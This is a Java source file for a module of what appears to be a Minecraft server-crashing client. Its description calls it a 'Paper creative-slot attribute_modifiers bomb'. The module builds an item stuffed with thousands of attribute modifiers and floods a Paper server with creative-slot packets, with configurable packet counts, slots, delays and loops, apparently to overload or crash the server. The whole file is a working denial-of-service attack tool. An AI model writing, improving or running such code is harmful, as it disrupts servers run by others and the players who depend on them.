package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataAttributeModifiers;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class CreativeAttributeModifiers extends Module {
	private ScheduledExecutorService executorService;

	public CreativeAttributeModifiers() {
		super("CreativeAttributeModifiers", "Paper creative-slot attribute_modifiers bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "50");
		addArgument("modifiers", ArgumentType.INT, 1, 100000, "4096");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		DataComponents components = new DataComponents();
		components.put(new DataAttributeModifiers(context.getInt("modifiers"), true));
		ItemStack item = new ItemStack(ItemType.DIAMOND_SWORD.getId(protocol), 1, components);
		executorService = CreativeAttackHelper.start(
				this, context, executorService,
				context.getInt("packets"), context.getInt("threadSleep"), context.getInt("loopAmount"),
				context.getInt("slot"), item
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
